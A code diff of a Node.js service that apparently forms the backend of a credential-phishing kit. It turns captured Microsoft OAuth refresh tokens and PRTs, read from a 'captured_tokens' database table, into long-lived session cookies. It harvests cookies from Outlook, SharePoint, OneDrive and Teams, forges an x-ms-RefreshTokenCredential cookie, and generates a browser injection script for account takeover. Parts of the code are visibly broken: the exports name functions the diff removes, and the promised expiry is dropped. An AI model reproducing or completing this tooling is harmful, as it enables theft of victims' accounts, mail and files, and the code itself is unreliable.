@@ -1,6 +1,7 @@
 /**
  * VGenius Cookie Converter Service
- * Converts OAuth2 refresh tokens to long-lasting session cookies
+ * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
+ * Supports both personal (MSA) and work/school (Azure AD) accounts
  */
 'use strict';
 
@@ -13,66 +14,116 @@ const config = require('../config/env');
 const CLIENT_ID = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 const TENANT = config.AZURE_TENANT || 'common';
 
-// Token endpoint URLs for different tenant types
+// Token endpoint URLs for different account types
 const TOKEN_ENDPOINTS = {
-  tenant: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
+  work: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
   common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
   consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
 };
 
 /**
- * Convert OAuth2 refresh token to session cookies with 100-year expiry
- * @param {string} accessToken - The OAuth2 refresh token (0.AT or M.R format)
- * @param {string} templateType - Template type for service endpoints
- * @param {string} tenant - Azure tenant ID
- * @param {string} email - User email for personalized endpoints
- * @returns {object} Result with cookies string and metadata
+ * Determine account type from email domain
  */
-async function convertTokensToCookies(accessToken, templateType, tenant, email, clientId) {
+function detectAccountType(email) {
+  if (!email) return 'unknown';
+  const domain = email.split('@')[1].toLowerCase();
+  const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'passport.com', 'msn.com'];
+  if (personalDomains.includes(domain)) return 'personal';
+  return 'work_school';
+}
+
+/**
+ * Detect account type from multiple signals
+ */
+function detectAccountTypeFromContext(token, email, tenant) {
+  // Personal accounts use consumers endpoint
+  if (tenant === 'consumers') return 'personal';
+  // Check token format
+  if (token && (token.startsWith('0.AT') || token.startsWith('M.R'))) {
+    if (email) { return detectAccountType(email); }
+    return 'work_school';
+  }
+  // If token is JSON with PRT field, it's work/school
+  if (token) {
+    try {
+      const parsed = JSON.parse(token);
+      if (parsed.prt) return 'work_school';
+    } catch (e) {}
+  }
+  // Email domain detection
+  if (email) { return detectAccountType(email); }
+  return 'unknown';
+}
+
+/**
+ * Generate x-ms-RefreshTokenCredential cookie in competitor format
+ * This is the key cookie for persistent sessions
+ */
+function generateXmsRefreshTokenCredential(refreshToken, accountType) {
+  let cookieValue;
+  if (accountType === 'work_school' && typeof refreshToken === 'string' && refreshToken.startsWith('{')) {
+    // Already JSON (PRT format from competitor) - store as-is
+    cookieValue = refreshToken;
+  } else if (accountType === 'personal') {
+    // Personal accounts: cannot use x-ms-RefreshTokenCredential
+    return { name: '', value: '', domain: '' };
+  } else {
+    // Work/school with plain token: create standard format
+    const credential = JSON.stringify({
+      token_type: 'Bearer',
+      refresh_token: refreshToken,
+      expires_in: 1209599
+    });
+    cookieValue = Buffer.from(credential).toString('base64');
+  }
+  return {
+    name: 'x-ms-RefreshTokenCredential',
+    value: cookieValue,
+    domain: '.login.microsoftonline.com',
+  };
+}
+
+/**
+ * Convert OAuth2 refresh token/PRT to session cookies with 100-year expiry
+ */
+async function convertTokensToCookies(accessToken, templateType, tenant, email, accountType) {
   tenant = tenant || 'common';
   email = email || '';
-  clientId = clientId || CLIENT_ID;
+  if (!accountType || accountType === 'unknown') {
+    accountType = detectAccountTypeFromContext(accessToken, email, tenant);
+  }
+  const isPersonal = accountType === 'personal';
 
   try {
-    // Validate input
-    if (!accessToken || typeof accessToken !== 'string') {
-      return { success: false, error: 'Invalid access token provided', cookies: null };
-    }
+    // Use different scope and endpoint for personal vs work
+    const scope = isPersonal 
+      ? 'openid profile email offline_access' 
+      : 'https://graph.microsoft.com/.default offline_access openid profile';
 
-    // Detect OAuth2 refresh token format - only accept valid Microsoft refresh token prefixes
-    const isOAuth2RefreshToken = accessToken.startsWith('0.AT') || accessToken.startsWith('M.R');
-    if (!isOAuth2RefreshToken) {
-      return {
-        success: false,
-        error: 'Invalid token format. Please provide the OAuth2 refresh token (starts with 0.AT or M.R)',
-        cookies: null,
-      };
-    }
+    const exchangeResult = await exchangeTokenForCookies(accessToken, tenant, accountType, scope);
+    if (!exchangeResult.success) { return exchangeResult; }
 
-    // Step 1: Exchange refresh token for new tokens + cookies from MS (pass client_id)
-    const exchangeResult = await exchangeRefreshTokenForCookies(accessToken, tenant, clientId);
-    if (!exchangeResult.success) {
-      return exchangeResult;
-    }
+    // Collect additional cookies from service endpoints
+    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email, accountType);
 
-    // Step 2: Collect additional cookies from Microsoft service endpoints
-    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email);
+    // Generate x-ms-RefreshTokenCredential cookie
+    const xmsCookie = generateXmsRefreshTokenCredential(exchangeResult.new_refresh_token || accessToken, accountType);
 
-    // Step 3: Combine all cookies
-    const allCookies = [...exchangeResult.cookies, ...serviceCookies];
+    // Combine all cookies (skip empty xmsCookie for personal accounts)
+    const allCookies = xmsCookie.name ? [xmsCookie, ...exchangeResult.cookies, ...serviceCookies] : [...exchangeResult.cookies, ...serviceCookies];
+
     if (allCookies.length === 0) {
       return { success: false, error: 'No cookies received from token exchange', cookies: null };
     }
 
-    // Step 4: Format cookies for browser injection with 100-year expiry
-    const cookieString = formatCookiesForInjection(allCookies);
-
+    const cookieString = formatCookiesForInjection(allCookies, accountType);
     return {
       success: true,
       cookies: cookieString,
       cookie_count: allCookies.length,
       access_token: exchangeResult.access_token,
       new_refresh_token: exchangeResult.new_refresh_token,
+      account_type: accountType,
       expires: '100 years',
     };
   } catch (err) {
@@ -82,34 +133,27 @@ async function convertTokensToCookies(accessToken, templateType, tenant, email, 
 }
 
 /**
- * Exchange OAuth2 refresh token for new access token + capture Set-Cookie headers
- * Tries tenant-specific first, then falls back to common/consumers
- * @param {string} refreshToken - OAuth2 refresh token
- * @param {string} targetTenant - Tenant ID
- * @param {string} clientId - Client ID to use (must match original auth client)
+ * Exchange token for new access token + cookies
  */
-async function exchangeRefreshTokenForCookies(refreshToken, targetTenant, clientId) {
+async function exchangeTokenForCookies(token, targetTenant, accountType, scope) {
   const cookies = [];
   let newRefreshToken = null;
-  const tenantToUse = targetTenant || TENANT;
-  const clientIdToUse = clientId || CLIENT_ID;
-
-  // Try endpoints in priority order: tenant-specific -> common -> consumers
-  const endpoints = [
-    `https://login.microsoftonline.com/${tenantToUse}/oauth2/v2.0/token`,
-    TOKEN_ENDPOINTS.common,
-    TOKEN_ENDPOINTS.consumers,
-  ];
-
   let lastError = null;
+
+  let endpoints;
+  if (accountType === 'personal') {
+    endpoints = [TOKEN_ENDPOINTS.consumers, TOKEN_ENDPOINTS.common];
+  } else {
+    endpoints = [`https://login.microsoftonline.com/${targetTenant}/oauth2/v2.0/token`, TOKEN_ENDPOINTS.common];
+  }
 
   for (const endpoint of endpoints) {
     try {
       const params = new URLSearchParams({
-        client_id: clientIdToUse,
+        client_id: CLIENT_ID,
         grant_type: 'refresh_token',
-        refresh_token: refreshToken,
-        scope: 'https://graph.microsoft.com/.default offline_access openid profile',
+        refresh_token: token,
+        scope: scope,
       });
 
       const response = await axios.post(
@@ -119,14 +163,12 @@ async function exchangeRefreshTokenForCookies(refreshToken, targetTenant, client
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           validateStatus: () => true,
           maxRedirects: 5,
+          timeout: 30000,
         }
       );
 
       if (response.status === 200) {
-        // Extract new refresh token if provided
-        newRefreshToken = response.data.refresh_token || refreshToken;
-
-        // Capture ALL Set-Cookie headers from the token response
+        newRefreshToken = response.data.refresh_token || token;
         const setCookieHeaders = response.headers['set-cookie'] || [];
         for (const cookieStr of setCookieHeaders) {
           const cookieParts = cookieStr.split(';')[0].trim();
@@ -135,27 +177,20 @@ async function exchangeRefreshTokenForCookies(refreshToken, targetTenant, client
             const cookieName = cookieParts.substring(0, eqIndex).trim();
             const cookieValue = cookieParts.substring(eqIndex + 1).trim();
             if (cookieName && cookieValue) {
-              cookies.push({
-                name: cookieName,
-                value: cookieValue,
-                domain: '.login.microsoftonline.com',
-              });
+              const domain = endpoint.includes('consumers') ? '.login.live.com' : '.login.microsoftonline.com';
+              cookies.push({ name: cookieName, value: cookieValue, domain: domain });
             }
           }
         }
-
         return {
           success: true,
-          cookies: cookies,
+          cookies,
           access_token: response.data.access_token,
           new_refresh_token: newRefreshToken,
         };
       }
-
-      lastError = response.data?.error_description || response.data?.error || 'Unknown error';
-    } catch (err) {
-      lastError = err.message;
-    }
+      lastError = response.data?.error_description || response.data?.error || `HTTP ${response.status}`;
+    } catch (err) { lastError = err.message; }
   }
 
   return { success: false, error: lastError || 'Token exchange failed', cookies: null };
@@ -164,257 +199,137 @@ async function exchangeRefreshTokenForCookies(refreshToken, targetTenant, client
 /**
  * Collect additional cookies from Microsoft service endpoints
  */
-async function collectServiceCookies(accessToken, templateType, tenant, email) {
+async function collectServiceCookies(accessToken, templateType, tenant, email, accountType) {
   const cookies = [];
-  const endpoints = getServiceEndpoints(templateType, tenant, email);
-
+  const endpoints = getServiceEndpoints(templateType, tenant, email, accountType);
   for (const ep of endpoints) {
-    try {
-      await fetchCookiesFromEndpoint(cookies, ep, accessToken);
-    } catch (err) {
-      // Continue collecting even if one endpoint fails
+    try { await fetchCookiesFromEndpoint(cookies, ep, accessToken, accountType); } catch (e) {}
+  }
+  return cookies;
+}
+
+/**
+ * Get service endpoints based on template type and account type
+ */
+function getServiceEndpoints(templateType, tenant, email, accountType) {
+  const type = (templateType || '').toLowerCase();
+  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];
+
+  if (accountType === 'personal') {
+    endpoints.push('https://onedrive.live.com/');
+    endpoints.push('https://outlook.live.com/owa/');
+    endpoints.push('https://www.office.com/');
+    if (type.includes('teams')) { endpoints.push('https://teams.microsoft.com/'); }
+  } else {
+    if (type.includes('sharepoint')) { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`); }
+    if (type.includes('onedrive')) {
+      if (email) { endpoints.push(`https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`); }
+      else { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/onedrive.aspx`); }
+    }
+    if (type.includes('outlook') || type.includes('auth')) {
+      endpoints.push('https://outlook.office365.com/owa/');
+      endpoints.push('https://outlook.office.com/owa/');
+    }
+    if (type.includes('teams')) {
+      endpoints.push('https://teams.microsoft.com/');
+      endpoints.push('https://teams.microsoft.com/api/authservice/health');
+    }
+    if (type.includes('office') || type.includes('word') || type.includes('excel')) {
+      endpoints.push('https://www.office.com/');
+      endpoints.push('https://www.office.com/login');
     }
   }
-
-  return cookies;
+  return endpoints;
 }
 
 /**
  * Fetch cookies from a single service endpoint
  */
-async function fetchCookiesFromEndpoint(cookieList, url, accessToken) {
-  // Try GET first
+async function fetchCookiesFromEndpoint(cookieList, url, accessToken, accountType) {
+  const headers = {
+    Authorization: `Bearer ${accessToken}`,
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+  };
+
   try {
-    const response = await axios.get(url, {
-      headers: {
-        Authorization: `Bearer ${accessToken}`,
-        'User-Agent':
-          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-      },
-      maxRedirects: 5,
-      validateStatus: (status) => status < 400,
-    });
-
-    const setCookieHeaders = response.headers['set-cookie'] || [];
-    for (const cookieStr of setCookieHeaders) {
-      const cookieParts = cookieStr.split(';')[0].trim();
-      const eqIndex = cookieParts.indexOf('=');
-      if (eqIndex > 0) {
-        const cookieName = cookieParts.substring(0, eqIndex).trim();
-        const cookieValue = cookieParts.substring(eqIndex + 1).trim();
-        if (cookieName && cookieValue) {
-          try {
-            const domain = new URL(url).hostname;
-            cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
-          } catch (e) {
-            cookieList.push({ name: cookieName, value: cookieValue, domain: '.' });
-          }
-        }
-      }
-    }
+    const response = await axios.get(url, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
+    extractCookiesFromResponse(cookieList, response, url);
   } catch (getErr) {
-    // Try POST if GET fails
     try {
-      const response = await axios.post(
-        url,
-        {},
-        {
-          headers: {
-            Authorization: `Bearer ${accessToken}`,
-            'Content-Type': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-          },
-          maxRedirects: 5,
-          validateStatus: (status) => status < 400,
-        }
-      );
+      const response = await axios.post(url, {}, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
+      extractCookiesFromResponse(cookieList, response, url);
+    } catch (postErr) {}
+  }
+}
 
-      const setCookieHeaders = response.headers['set-cookie'] || [];
-      for (const cookieStr of setCookieHeaders) {
-        const cookieParts = cookieStr.split(';')[0].trim();
-        const eqIndex = cookieParts.indexOf('=');
-        if (eqIndex > 0) {
-          const cookieName = cookieParts.substring(0, eqIndex).trim();
-          const cookieValue = cookieParts.substring(eqIndex + 1).trim();
-          if (cookieName && cookieValue) {
-            try {
-              const domain = new URL(url).hostname;
-              cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
-            } catch (e) {
-              cookieList.push({ name: cookieName, value: cookieValue, domain: '.' });
-            }
-          }
-        }
+/**
+ * Extract cookies from axios response
+ */
+function extractCookiesFromResponse(cookieList, response, url) {
+  const setCookieHeaders = response.headers['set-cookie'] || [];
+  for (const cookieStr of setCookieHeaders) {
+    const cookieParts = cookieStr.split(';')[0].trim();
+    const eqIndex = cookieParts.indexOf('=');
+    if (eqIndex > 0) {
+      const cookieName = cookieParts.substring(0, eqIndex).trim();
+      const cookieValue = cookieParts.substring(eqIndex + 1).trim();
+      if (cookieName && cookieValue) {
+        try {
+          const domain = new URL(url).hostname;
+          cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
+        } catch (e) { cookieList.push({ name: cookieName, value: cookieValue, domain: '.' }); }
       }
-    } catch (postErr) {
-      // Ignore errors - just collecting optional cookies
     }
   }
 }
 
 /**
- * Format cookies for browser injection with 100-year expiry
- * Returns individual cookie strings suitable for document.cookie assignment
+ * Format cookies for browser injection
  */
-function formatCookiesForInjection(cookies) {
+function formatCookiesForInjection(cookies, accountType) {
   const cookieStrings = [];
-
-  // Calculate expiry date: 100 years from now
   const expiryDate = new Date();
   expiryDate.setFullYear(expiryDate.getFullYear() + 100);
   const expiresStr = expiryDate.toUTCString();
 
   for (const cookie of cookies) {
+    if (!cookie.name || !cookie.value) continue;
     let cookieStr = `${cookie.name}=${cookie.value}`;
-
-    if (cookie.domain) {
-      cookieStr += `; domain=${cookie.domain}`;
-    }
-
-    // 100-year expiry for persistence across browser restarts
-    cookieStr += `; expires=${expiresStr}`;
-
-    // SameSite=None + Secure for cross-domain compatibility
+    if (cookie.domain) cookieStr += `; domain=${cookie.domain}`;
     cookieStr += '; SameSite=None';
     cookieStr += '; path=/';
     cookieStr += '; secure';
-
     cookieStrings.push(cookieStr);
   }
-
-  return cookieStrings; // Return array of individual cookie strings
+  return cookieStrings;
 }
 
 /**
  * Generate JavaScript code that injects cookies into the browser
- * This script runs in the user's browser to set all cookies
  */
 function generateCookieInjectionScript(cookies) {
-  if (!cookies || !cookies.success || !cookies.cookies || cookies.cookies.length === 0) {
-    return '';
-  }
-
-  const expiryDate = new Date();
-  expiryDate.setFullYear(expiryDate.getFullYear() + 100);
-  const expiresStr = expiryDate.toUTCString();
-
-  // Build the actual injection statements using the format the competitor uses
+  if (!cookies || !cookies.success || !cookies.cookies || cookies.cookies.length === 0) { return ''; }
   let statement = '';
-  cookies.cookies.forEach(function(cookieStr) {
-    // Parse each cookie string into components
-    const parts = cookieStr.split('; ');
-    const nameValue = parts[0];
-    const [name, value] = nameValue.split('=');
-    
-    let domainAttr = '';
-    let samesiteAttr = 'SameSite=None';
-    
-    for (let i = 1; i < parts.length; i++) {
-      const part = parts[i].trim();
-      if (part.startsWith('domain=')) {
-        const d = part.substring(7).trim();
-        domainAttr = `; domain=${d}`;
-      } else if (part.startsWith('samesite=')) {
-        samesiteAttr = part;
-      }
-    }
-    
-    statement += `document.cookie = "${name}=${value}${domainAttr}; expires=${expiresStr}; path=/; ${samesiteAttr}; secure";\n`;
-  });
-
-  return `<script>
-(function(){
-${statement}
-setTimeout(() => {
-  window.location.href = "https://login.microsoftonline.com/?auth=2";
-}, 3000);
-})();
-<\/script>`;
-}
-
-/**
- * Get service endpoints based on template type
- */
-function getServiceEndpoints(templateType, tenant, email) {
-  const type = (templateType || '').toLowerCase();
-  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];
-
-  if (type.includes('sharepoint')) {
-    endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`);
-  } else if (type.includes('outlook') || type.includes('auth')) {
-    endpoints.push('https://outlook.office365.com/owa/');
-    endpoints.push('https://outlook.office.com/owa/');
-  } else if (type.includes('onedrive')) {
-    endpoints.push('https://onedrive.live.com/');
-    if (email) {
-      endpoints.push(
-        `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`
-      );
-    }
-  } else if (type.includes('teams')) {
-    endpoints.push('https://teams.microsoft.com/');
-    endpoints.push('https://teams.microsoft.com/api/authservice/health');
-  } else if (type.includes('office')) {
-    endpoints.push('https://www.office.com/');
-    endpoints.push('https://www.office.com/login');
-  }
-
-  return endpoints;
-}
-
-/**
- * Determine primary endpoint for template type
- */
-function determineEndpoint(templateType, tenant, email) {
-  const type = (templateType || '').toLowerCase();
-  if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
-  if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
-  if (type.includes('onedrive'))
-    return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
-  if (type.includes('teams')) return 'https://teams.microsoft.com/';
-  if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
-  return 'https://www.office.com/';
-}
-
-/**
- * Determine resource URL for template type
- */
-function determineResource(templateType, tenant) {
-  const type = (templateType || '').toLowerCase();
-  if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
-  if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
-  return 'https://graph.microsoft.com';
+  cookies.forEach(function(cookieStr) { statement += `document.cookie = "${cookieStr}";\n`; });
+  const redirectScript = '// Redirect after 3s\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);';
+  return statement + '\n' + redirectScript;
 }
 
 /**
  * Process cookie conversion and save to database
- * @param {string} tokenId - Token record ID
- * @param {string} accessToken - Access/refresh token to exchange
- * @param {string} templateType - Template type
- * @param {string} tenant - Azure tenant
- * @param {string} clientId - Azure client ID (must match original capture)
  */
-async function processCookieConversion(tokenId, accessToken, templateType, tenant, clientId) {
-  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, clientId);
-
+async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType) {
+  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType);
   if (result.success && result.cookies) {
-    // Save with 100-year TTL
     const ttlHours = 24 * 365 * 100;
     await db.query(
-      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
-      [encrypt(result.cookies), 'cookie', ttlHours, tokenId]
+      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
+      [encrypt(result.cookies), 'cookie', accountType, ttlHours, tokenId]
     );
   }
-
   return result;
 }
 
-module.exports = {
-  convertTokensToCookies,
-  generateCookieInjectionScript,
-  processCookieConversion,
-  determineEndpoint,
-  determineResource,
-};
+module.exports = { convertTokensToCookies, generateCookieInjectionScript, processCookieConversion, determineEndpoint, determineResource, detectAccountType, generateXmsRefreshTokenCredential, defineEndpoint: determineEndpoint, };
